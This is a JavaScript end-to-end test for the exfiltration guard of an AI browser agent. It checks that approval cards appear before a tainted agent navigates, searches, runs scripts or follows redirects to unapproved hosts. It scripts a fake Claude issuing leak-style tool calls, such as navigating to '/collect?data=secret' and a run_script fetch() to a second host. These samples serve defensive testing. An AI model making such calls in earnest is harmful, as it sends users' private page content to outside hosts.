// Exfiltration guard: once a run has read page content, taking the browser to a host the user hasn't
// approved (navigate / open_tab / read_urls) asks first; approved hosts and runs that read nothing go
// freely; outside (MCP) agents are always asked; an approved host redirecting to a new one asks too;
// web_search asks before sending the query; run_script and each batch step are gated per site;
// list_tabs hides query strings and Lumen's own tabs.
const { _electron: electron } = require('playwright-core');
const fs = require('fs');
const http = require('http');
const os = require('os');
const path = require('path');

(async () => {
  let failures = 0;
  const check = (label, ok, detail) => { if (!ok) failures++; console.log(`${ok ? 'PASS' : 'FAIL'}  ${label}${ok ? '' : `  -> ${String(detail).slice(0, 600)}`}`); };
  const hits = []; // "<host><path>" of every request, to see what reached the second host
  const server = http.createServer((req, res) => {
    hits.push(`${req.headers.host}${req.url}`);
    // /redirect?to=<url>: a 302 to wherever `to` says (an open redirect on an approved site).
    const to = new URL(req.url, 'http://x').searchParams.get('to');
    if (req.url.startsWith('/redirect') && to) {
      res.writeHead(302, { Location: to });
      res.end();
      return;
    }
    res.setHeader('Content-Type', 'text/html');
    if (req.url.startsWith('/buttons')) {
      res.end(`<title>Buttons</title><button onclick="document.title = 'clicked'">Go</button>`);
      return;
    }
    res.end(`<title>Page ${req.url}</title><h1>Secret ${req.url}</h1><p>Private text on this page.</p>`);
  }).listen(0, '127.0.0.1');
  await new Promise((r) => server.once('listening', r));
  const port = server.address().port;
  // Same server, different hosts as far as approvals go: 127.0.0.1:<port> and localhost:<port>.
  const home = `http://127.0.0.1:${port}`;
  const other = `http://localhost:${port}`;
  const homeHost = `127.0.0.1:${port}`;
  const otherHost = `localhost:${port}`;

  const profile = fs.mkdtempSync(path.join(os.tmpdir(), 'lumen-exfil-'));
  const app = await electron.launch({ args: [path.join(__dirname, '..')], env: { ...process.env, CLAUDE_BROWSER_TEST: '1', CLAUDE_BROWSER_PROFILE: profile } });
  const ui = await app.firstWindow();
  const errors = [];
  ui.on('pageerror', (e) => errors.push(e.message));
  await ui.waitForSelector('.tab');

  await app.evaluate(() => {
    const agent = global.__agent;
    agent.browser.autoApprove = () => false; // the test switch normally auto-allows everything
    agent.browser.effectiveModel = (m) => m; // a fake Claude below; skip the connected-model check
    const base = agent.getOptions;
    global.__pageContext = true;
    agent.getOptions = () => ({ ...base(), pageContext: global.__pageContext });
  });

  // One sidebar run with a fake Claude that asks for `toolUses` in order, answering every approval
  // card with `answer`. Starts from a fresh chat (no approved hosts) unless keepHosts.
  const run = (opts) => app.evaluate(async (_e, { toolUses, answer, startUrl, approve = [], pageContext = true, fresh = true }) => {
    const agent = global.__agent;
    if (fresh) agent.reset(); // New chat; fresh: false sends another message in the same chat
    for (const h of approve) agent.approvedHosts.add(h);
    global.__pageContext = pageContext;
    const tab = agent.browser.activeTab();
    if (startUrl) await tab.webContents.loadURL(startUrl).catch(() => {});
    agent.messages.settings = { model: 'claude-opus-5', adhdMode: true };
    let turn = 0;
    agent.getClient = () => ({ beta: { messages: { stream: () => {
      const t = turn++;
      const message = t < toolUses.length
        ? { role: 'assistant', model: 'claude-opus-5', stop_reason: 'tool_use', content: [{ type: 'tool_use', id: `toolu_${t}`, name: toolUses[t].name, input: toolUses[t].input }] }
        : { role: 'assistant', model: 'claude-opus-5', stop_reason: 'end_turn', content: [{ type: 'text', text: 'Done.' }] };
      return { async *[Symbol.asyncIterator]() {}, finalMessage: async () => message };
    } } } });
    const events = [];
    await agent.run('do it', (e) => {
      events.push(e);
      if (e.type === 'approval') setTimeout(() => agent.resolveApproval(e.approvalId, answer), 20);
    });
    const results = agent.messages.flatMap((m) => (Array.isArray(m.content) ? m.content : []))
      .filter((b) => b.type === 'tool_result')
      .map((b) => ({ error: Boolean(b.is_error), text: typeof b.content === 'string' ? b.content : JSON.stringify(b.content).slice(0, 300) }));
    return {
      approvals: events.filter((e) => e.type === 'approval').map(({ host, action, title, query }) => ({ host, action, title, query })),
      approved: [...agent.approvedHosts],
      results,
      url: agent.browser.activeTab().webContents.getURL(),
      tabs: agent.browser.listTabs().length,
    };
  }, opts);

  // 1. Read the page, then navigate to a new host: a card, and "Don't allow" keeps the tab where it was.
  let r = await run({ startUrl: `${home}/inbox`, pageContext: false, answer: false, toolUses: [
    { name: 'read_page', input: {} },
    { name: 'navigate', input: { url: `${other}/collect?data=secret` } },
  ] });
  check('read_page then navigate to a new host shows an approval card', r.approvals.length === 1 && r.approvals[0].host === otherHost && r.approvals[0].action === 'open', JSON.stringify(r.approvals));
  check('the card names the agent and the host', r.approvals[0]?.title === `Claude wants to open ${otherHost}`, JSON.stringify(r.approvals));
  check('denied: the navigation did not happen', r.url.startsWith(home) && r.results[1]?.error && /did not allow Claude to open/.test(r.results[1].text), JSON.stringify(r));

  // 2. Same, approved: the tab goes there.
  r = await run({ startUrl: `${home}/inbox`, pageContext: false, answer: true, toolUses: [
    { name: 'read_page', input: {} },
    { name: 'navigate', input: { url: `${other}/collect` } },
  ] });
  check('allowed: the navigation happens', r.approvals.length === 1 && r.url.startsWith(other), JSON.stringify(r));

  // 3. Host already approved in this chat: no card.
  r = await run({ startUrl: `${home}/inbox`, pageContext: false, answer: false, approve: [otherHost], toolUses: [
    { name: 'read_page', input: {} },
    { name: 'navigate', input: { url: `${other}/collect` } },
  ] });
  check('an already-approved host gets no card', r.approvals.length === 0 && r.url.startsWith(other), JSON.stringify(r));

  // 4. A run that read nothing navigates freely (and the taint from earlier runs doesn't carry over).
  r = await run({ startUrl: `${home}/inbox`, pageContext: false, answer: false, toolUses: [
    { name: 'navigate', input: { url: `${other}/somewhere` } },
  ] });
  check('an untainted run navigates without a card', r.approvals.length === 0 && r.url.startsWith(other), JSON.stringify(r));

  // 4b. Page content read in one message stays in the chat: a later message in the same chat is
  // still asked; New chat starts clean.
  r = await run({ startUrl: `${home}/inbox`, pageContext: false, answer: false, toolUses: [{ name: 'read_page', input: {} }] });
  r = await run({ fresh: false, pageContext: false, answer: false, toolUses: [{ name: 'navigate', input: { url: `${other}/collect` } }] });
  check('a read in message 1 still asks before navigating in message 2 of the same chat', r.approvals.length === 1 && r.approvals[0].host === otherHost && r.url.startsWith(home), JSON.stringify(r));
  r = await run({ startUrl: `${home}/inbox`, pageContext: false, answer: false, toolUses: [{ name: 'navigate', input: { url: `${other}/collect` } }] });
  check('after New chat, the same navigation goes without a card', r.approvals.length === 0 && r.url.startsWith(other), JSON.stringify(r));

  // 5. The page text attached to the message counts as reading it.
  r = await run({ startUrl: `${home}/inbox`, pageContext: true, answer: false, toolUses: [
    { name: 'navigate', input: { url: `${other}/collect` } },
  ] });
  check('with the page attached, navigating to a new host asks', r.approvals.length === 1 && r.approvals[0].host === otherHost && r.url.startsWith(home), JSON.stringify(r));

  // 6. open_tab after list_tabs asks too; denied, no tab opens.
  r = await run({ startUrl: `${home}/inbox`, pageContext: false, answer: false, toolUses: [
    { name: 'list_tabs', input: {} },
    { name: 'open_tab', input: { url: `${other}/x` } },
  ] });
  check('list_tabs then open_tab to a new host asks', r.approvals.length === 1 && r.approvals[0].host === otherHost && r.results[1]?.error, JSON.stringify(r));

  // 7. read_urls to two new hosts: one card per host. (Going back to the page's own host still asks:
  // it isn't approved, and the page itself could be the one collecting.)
  r = await run({ startUrl: `${home}/inbox`, pageContext: false, answer: true, toolUses: [
    { name: 'find', input: { query: 'Secret' } },
    { name: 'read_urls', input: { urls: [`${other}/a`, `${home}/b`, `${other}/c`] } },
  ] });
  check('read_urls asks once per new host', r.approvals.length === 2 && r.approvals.map((a) => a.host).sort().join() === [homeHost, otherHost].sort().join() && !r.results[1]?.error, JSON.stringify(r));

  // 7b. An approved host that redirects to a new one: the redirect is stopped and asked about.
  // Denied, the tab stays off the second host and nothing reaches it; allowed, the tab goes there.
  const bounce = (path) => `${home}/redirect?to=${encodeURIComponent(`${other}${path}`)}`;
  r = await run({ startUrl: `${home}/inbox`, pageContext: false, answer: false, approve: [homeHost], toolUses: [
    { name: 'read_page', input: {} },
    { name: 'navigate', input: { url: bounce('/landing-denied') } },
  ] });
  check('a redirect from an approved host to a new one shows an approval card', r.approvals.length === 1 && r.approvals[0].host === otherHost && r.approvals[0].action === 'open', JSON.stringify(r.approvals));
  check('denied: the tab stays off the second host and the request never reaches it', r.url.startsWith(home) && r.results[1]?.error && /redirected to .* did not allow Claude/.test(r.results[1].text) && !hits.includes(`${otherHost}/landing-denied`), JSON.stringify({ r, hits: hits.slice(-4) }));
  r = await run({ startUrl: `${home}/inbox`, pageContext: false, answer: true, approve: [homeHost], toolUses: [
    { name: 'read_page', input: {} },
    { name: 'navigate', input: { url: bounce('/landing-allowed') } },
  ] });
  check('allowed: the redirect goes on to the second host', r.approvals.length === 1 && r.url === `${other}/landing-allowed` && !r.results[1]?.error, JSON.stringify(r));
  r = await run({ startUrl: `${home}/inbox`, pageContext: false, answer: false, approve: [homeHost], toolUses: [
    { name: 'navigate', input: { url: bounce('/landing-untainted') } },
  ] });
  check('an untainted run follows the redirect without a card', r.approvals.length === 0 && r.url === `${other}/landing-untainted`, JSON.stringify(r));
  r = await run({ startUrl: `${home}/inbox`, pageContext: false, answer: false, approve: [homeHost], toolUses: [
    { name: 'read_page', input: {} },
    { name: 'read_urls', input: { urls: [bounce('/hidden-denied')] } },
  ] });
  check('read_urls: a redirect to a new host asks, and denied, the page is not read', r.approvals.length === 1 && r.approvals[0].host === otherHost && /did not allow Claude/.test(r.results[1]?.text) && !/Secret \/hidden-denied/.test(r.results[1]?.text) && !hits.includes(`${otherHost}/hidden-denied`), JSON.stringify(r));

  // 7c. web_search in a tainted run: a card with the query; denied, nothing is searched. Allowed,
  // DuckDuckGo joins the chat's approved sites. A run that read nothing searches without a card.
  const secretQuery = 'Secret /inbox private text';
  r = await run({ startUrl: `${home}/inbox`, pageContext: false, answer: false, toolUses: [
    { name: 'read_page', input: {} },
    { name: 'web_search', input: { query: secretQuery } },
  ] });
  check('read_page then web_search shows a card with the query', r.approvals.length === 1 && r.approvals[0].host === 'html.duckduckgo.com' && r.approvals[0].action === 'open' && r.approvals[0].query === secretQuery && r.approvals[0].title.includes(secretQuery), JSON.stringify(r.approvals));
  check('denied: the search is not sent', r.results[1]?.error && /did not allow Claude to send this search/.test(r.results[1].text), JSON.stringify(r.results));
  r = await run({ startUrl: `${home}/inbox`, pageContext: false, answer: true, toolUses: [
    { name: 'read_page', input: {} },
    { name: 'web_search', input: { query: 'lumen browser' } },
  ] });
  check('allowed: DuckDuckGo joins the approved sites', r.approvals.length === 1 && r.approved.includes('html.duckduckgo.com') && !/did not allow/.test(r.results[1]?.text), JSON.stringify(r));
  r = await run({ startUrl: `${home}/inbox`, pageContext: false, answer: false, toolUses: [
    { name: 'web_search', input: { query: 'lumen browser' } },
  ] });
  check('an untainted web_search shows no card', r.approvals.length === 0 && !/did not allow/.test(r.results[0]?.text), JSON.stringify(r));

  // 7d. run_script in a tainted run: a site approved for clicking doesn't cover scripts (they can
  // fetch() anywhere), so there is a script card; denied, the script doesn't run. Untainted: no card.
  r = await run({ startUrl: `${home}/inbox`, pageContext: false, answer: false, approve: [homeHost], toolUses: [
    { name: 'read_page', input: {} },
    { name: 'run_script', input: { code: `await fetch('${other}/fetched').catch(() => {}); return 1;` } },
  ] });
  check('a tainted run_script shows a script card, even on an approved site', r.approvals.length === 1 && r.approvals[0].host === homeHost && r.approvals[0].action === 'script' && r.approvals[0].title === `Claude wants to run a script on ${homeHost}`, JSON.stringify(r.approvals));
  check('denied: the script does not run and its fetch never goes out', r.results[1]?.error && /did not allow Claude to run scripts/.test(r.results[1].text) && !hits.includes(`${otherHost}/fetched`), JSON.stringify({ r, hits: hits.slice(-4) }));
  r = await run({ startUrl: `${home}/inbox`, pageContext: false, answer: false, approve: [homeHost], toolUses: [
    { name: 'run_script', input: { code: `await fetch('${other}/fetched-untainted').catch(() => {}); return 1;` } },
  ] });
  check('an untainted run_script on an approved site runs without a card', r.approvals.length === 0 && !r.results[0]?.error && hits.includes(`${otherHost}/fetched-untainted`), JSON.stringify(r));
  // Scripts allowed on the site: setting location to a new host is still stopped and asked about.
  r = await run({ startUrl: `${home}/inbox`, pageContext: false, answer: false, approve: [homeHost, `script:${homeHost}`], toolUses: [
    { name: 'read_page', input: {} },
    { name: 'run_script', input: { code: `location.href = '${other}/moved'; return 1;` } },
  ] });
  check('a tainted script sending the tab to a new host asks, and denied, the tab stays', r.approvals.length === 1 && r.approvals[0].host === otherHost && r.approvals[0].action === 'open' && r.url.startsWith(home) && !hits.includes(`${otherHost}/moved`), JSON.stringify(r));

  // 7e. Each batch step is checked where it runs, not only the site the batch was allowed on: here
  // the batch itself skipped the check (as if the tab changed sites after its OK) and its click asks.
  const batched = await app.evaluate(async (_e, h) => {
    const agent = global.__agent;
    agent.reset();
    const tab = agent.browser.activeTab();
    await tab.webContents.loadURL(`${h}/buttons`).catch(() => {});
    const events = [];
    const emit = (e) => { events.push(e); if (e.type === 'approval') setTimeout(() => agent.resolveApproval(e.approvalId, false), 20); };
    const session = { approvedHosts: new Set(), clientName: 'Test MCP' };
    const signal = new AbortController().signal;
    const report = await agent.inTask(tab.id, signal, async () => {
      await agent.ensureAllowed('read_page', emit, signal, { hosts: session.approvedHosts, who: session.clientName, external: true, input: {}, run: session });
      return agent.execute('batch', { steps: [{ do: 'click', text: 'Go' }] });
    });
    return { report, title: tab.webContents.getTitle(), approvals: events.filter((e) => e.type === 'approval').map(({ host, action }) => ({ host, action })) };
  }, home);
  check('a batch step on an unapproved site asks, and denied, it does not run', batched.approvals.length === 1 && batched.approvals[0].host === homeHost && /1\. FAILED: The user did not allow Test MCP to interact/.test(batched.report) && batched.title === 'Buttons', JSON.stringify(batched));

  // 8. Auto-allow covers the sidebar's AI; an outside MCP agent is still asked, taint kept per session.
  const mcp = await app.evaluate(async (_e, { home: h, other: o }) => {
    const agent = global.__agent;
    agent.browser.autoApprove = () => true;
    const events = [];
    const emit = (e) => { events.push(e); if (e.type === 'approval') setTimeout(() => agent.resolveApproval(e.approvalId, false), 20); };
    const session = { approvedHosts: new Set(), clientName: 'Test MCP' };
    const signal = new AbortController().signal;
    const allow = (input) => ({ hosts: session.approvedHosts, who: session.clientName, external: true, input, run: session });
    const out = {};
    await agent.inTask(agent.browser.activeTab().id, signal, () => agent.ensureAllowed('read_page', emit, signal, allow({})));
    // A separate call (its own task scope), same session: still tainted.
    out.denied = await agent.inTask(agent.browser.activeTab().id, signal, () => agent.ensureAllowed('navigate', emit, signal, allow({ url: `${o}/leak` })).then(() => null, (err) => err.message));
    // The sidebar's own run with auto-allow on: no card.
    const sidebarRun = {};
    await agent.inTask(agent.browser.activeTab().id, signal, async () => {
      await agent.ensureAllowed('read_page', emit, signal, { run: sidebarRun });
      await agent.ensureAllowed('navigate', emit, signal, { input: { url: `${h}/ok` }, run: sidebarRun });
    });
    agent.browser.autoApprove = () => false;
    out.approvals = events.filter((e) => e.type === 'approval').map(({ host, title }) => ({ host, title }));
    return out;
  }, { home, other });
  check('an outside MCP agent is asked even with auto-allow on', mcp.approvals.length === 1 && mcp.approvals[0].host === otherHost && mcp.approvals[0].title === `Test MCP wants to open ${otherHost}` && /did not allow Test MCP to open/.test(mcp.denied), JSON.stringify(mcp));

  // 9. list_tabs: no query strings or fragments, no Lumen pages (new tab, settings, history, file://).
  const tabs = await app.evaluate(async (_e, h) => {
    const agent = global.__agent;
    agent.browser.openTab(`${h}/search?q=private+stuff&token=abc#section`);
    agent.browser.openTab(); // a new-tab page
    global.__settings?.open?.();
    // (The new tabs commit their pages at their own pace; under load that can take longer than a fixed wait.)
    for (let end = Date.now() + 8000; Date.now() < end && !agent.browser.listTabs().some((t) => t.url.startsWith(`${h}/search`)); ) await new Promise((r) => setTimeout(r, 150));
    await new Promise((r) => setTimeout(r, 300));
    const raw = agent.browser.listTabs();
    const seen = JSON.parse(await agent.execute('list_tabs', {}));
    const web = seen.find((t) => t.url === `${h}/search`);
    const internal = raw.find((t) => /^file:/.test(t.url) && !/newtab\.html/.test(t.url)); // settings
    const switched = web ? await agent.execute('switch_tab', { tab_id: web.id }) : '';
    const refused = internal ? await agent.execute('switch_tab', { tab_id: internal.id }).then((x) => x, (err) => `ERR ${err.message}`) : 'no internal tab';
    return { raw: raw.map((t) => t.url), seen: seen.map((t) => t.url), switched, refused, internal: internal?.url || null };
  }, home);
  check('list_tabs shows the web tab without its query or fragment', tabs.seen.includes(`${home}/search`), JSON.stringify(tabs));
  check('list_tabs has no query strings or fragments', tabs.seen.every((u) => !/[?#]/.test(u)), JSON.stringify(tabs.seen));
  check('list_tabs has no internal or file:// tabs (and there were some); a blank new tab shows as ""', tabs.seen.every((u) => u === '' || /^https?:/.test(u)) && tabs.seen.includes('') && Boolean(tabs.internal), JSON.stringify(tabs));

  check('switch_tab reports the URL without its query or fragment', tabs.switched.endsWith(`${home}/search`), tabs.switched);
  check('switch_tab refuses Lumen pages and file:// tabs', /^ERR No tab with id/.test(tabs.refused), tabs.refused);

  // ---- the sidebar shows what a search or script card is asking for
  const cards = await ui.evaluate(() => {
    const text = (id) => { const card = approvals.get(id).card; const out = `${card.querySelector('.approval-title').textContent} | ${card.querySelector('.approval-detail').textContent}`; card.remove(); approvals.delete(id); return out; };
    showApproval(9001, 'html.duckduckgo.com', { action: 'open', title: 'Claude wants to search DuckDuckGo for “secret plans”', query: 'secret plans' });
    showApproval(9002, 'example.com', { action: 'script', title: 'Claude wants to run a script on example.com' });
    return { search: text(9001), script: text(9002) };
  });
  check('sidebar: a search card shows its title and the query', cards.search.startsWith('Claude wants to search DuckDuckGo for “secret plans”') && cards.search.includes('sends “secret plans” to html.duckduckgo.com'), cards.search);
  check('sidebar: a script card says it runs a script', cards.script.startsWith('Claude wants to run a script on example.com') && /script can send page content/.test(cards.script), cards.script);

  check('no UI errors', errors.length === 0, errors.join('; '));
  server.close();
  console.log(failures ? `${failures} FAILED` : 'ALL PASSED');
  await app.close();
  try { fs.rmSync(profile, { recursive: true, force: true }); } catch {}
  process.exit(failures ? 1 : 0);
})().catch((e) => { console.error(e); process.exit(1); });
